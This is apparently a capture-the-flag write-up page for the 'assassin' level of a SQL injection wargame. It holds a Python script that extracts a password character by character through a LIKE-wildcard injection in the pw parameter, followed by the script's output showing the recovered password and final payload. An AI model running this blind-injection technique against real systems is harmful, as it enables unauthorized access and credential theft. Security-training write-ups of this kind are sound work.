---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 15
---

### Script

```python title="assassin_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'cih6lj5v0dkr263t42fnn0d7br'}
url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'

guest_password = ''
admin_password = ''
searchspace = string.digits + string.ascii_letters
print()

for index in range(1, 9):
  for char in searchspace:
    payload = f"{guest_password}{char}"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f'{url}?pw={encoded_payload}%'

    response = requests.get(full_url, cookies=cookies)

    if ("Hello admin" in response.text):
      admin_password = guest_password + char 
      break
    elif ("Hello guest" in response.text):
      guest_password += char
      print(f'[x] Common password: {char}%')
      break

print()
print(f'[x] Distinct character: {char}%')
print(f'[!] Extracted password: {admin_password}%')
print(f'[!] Final payload: ?pw={admin_password}%')
```

```
$ python .\losqli.py

[x] Common password: 9%
[x] Common password: 0%

[x] Distinct character: 2%  
[!] Extracted password: 902%
[!] Final payload: ?pw=902% 
```
